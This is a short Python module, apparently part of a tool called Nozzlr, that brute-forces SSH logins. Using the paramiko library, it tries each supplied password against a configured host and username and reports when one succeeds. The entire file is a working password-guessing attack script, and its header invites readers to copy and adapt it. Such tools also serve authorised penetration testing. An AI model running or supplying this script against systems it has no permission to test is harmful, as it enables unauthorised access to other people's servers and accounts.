## Nozzlr module : SSH login bruteforcer  
# @author intrd - http://dann.com.br/ 
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/

# Make a copy of this module and adapt to your needs!

import paramiko

def nozz_module(payload,self=False):
	## Configs
	host="myhost.com"
	port=22
	user="username"
	timeout=15

	## Engine
	out={}
	out["code"]=""
	out["result"]=""
	code="null"
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host, port, user, password=payload, timeout=timeout)
	except paramiko.AuthenticationException as e:
		out["result"]=format(str(e)).strip()
		code="NEXT"
		out["code"]=code
		return out
	except Exception as e:
		#print " "
		out["result"]=format(str(e)).strip()
		code="error"
		ssh.close()
		out["code"]=code
		return out
	code="found: \""+payload+"\""
	out["code"]=code
	ssh.close()
	return out
		